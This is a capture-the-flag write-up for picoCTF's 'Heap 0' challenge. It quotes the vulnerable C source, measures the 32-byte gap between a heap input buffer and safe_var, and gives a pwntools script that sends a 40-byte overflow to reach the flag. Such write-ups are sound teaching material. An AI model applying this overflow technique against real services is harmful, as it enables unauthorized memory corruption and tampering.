# Heap 0

### Information
* Category: Pwn
* Point:
* Level: Easy

### Description
Are overflows just a stack concern?

Connect with the challenge instance here: `nc tethys.picoctf.net <PORT>`

### Hint
What part of the heap do you have control over and how far is it from the safe_var?

### Solution

#### What we got?
- The problem give us a binary file and a src code [`chall.c`](https://github.com/UITxWoodyNguyen/CTF/blob/main/Pwn/Heap%200/chall.c). This file give us 5 options:
    ```c
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
    ```

- Check out each function, we find the content of flag is printed in `check_win()` - case 4.
    ```c
    void check_win() {
        if (strcmp(safe_var, "bico") != 0) {
            printf("\nYOU WIN\n");

            // Print flag
            char buf[FLAGSIZE_MAX];
            FILE *fd = fopen("flag.txt", "r");
            fgets(buf, FLAGSIZE_MAX, fd);
            printf("%s\n", buf);
            fflush(stdout);

            exit(0);
        } else {
            printf("Looks like everything is still secure!\n");
            printf("\nNo flage for you :(\n");
            fflush(stdout);
        }
    }
    ```

    - This function means if `safe_var` is not equal to "bico". Moreover, this code have an option to write buffer, so the method we can use to crack is **buffer overflow**.

#### How to get the flag ?
- First, connect to the server and calculate to get the dist between `safe_var` and `input_data`:

    ![data](https://github.com/UITxWoodyNguyen/CTF/blob/main/Pwn/Heap%200/Screenshot%202025-12-01%20143600.png?raw=true)

- Sub 2 address, we will get the result is `0x20 = 32`. So an input with the length of at least 33 bytes can lead to overflow. We have a script to buffer and get the flag:

    ```python
    from pwn import *

    HOST = "tethys.picoctf.net"
    PORT = # port when start the game

    p = remote(HOST, PORT)

    # Sync to first menu
    p.recvuntil(b"Enter your choice:")

    # --- Step 1: Choose option 2 (write buffer) ---
    p.sendline(b"2")
    p.recvuntil(b"Data for buffer:")

    # Overflow payload
    payload = b"A" * 40
    p.sendline(payload)
    log.success(f"Sent overflow payload: {payload!r}")

    # --- Step 2: Trigger win (option 4) ---
    p.recvuntil(b"Enter your choice:")
    p.sendline(b"4")

    # --- Step 3: Receive the flag ---
    print(p.recvall().decode())
    ```

![flag](https://github.com/UITxWoodyNguyen/CTF/blob/main/Pwn/Heap%200/Screenshot%202025-12-01%20143550.png?raw=true)
